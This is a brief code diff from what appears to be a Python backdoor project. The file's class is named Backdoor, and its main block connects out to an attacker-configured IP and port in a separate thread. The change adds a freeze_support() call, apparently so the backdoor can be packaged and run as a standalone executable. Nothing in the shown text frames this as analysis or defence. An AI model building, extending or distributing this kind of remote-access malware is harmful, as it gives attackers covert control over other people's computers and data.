@@ -305,6 +305,8 @@ class Backdoor:
 
 if __name__ == "__main__":
 	from config import IP, PORT
+	multiprocessing.freeze_support()
+	
 	backdoor = Backdoor(IP, PORT)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
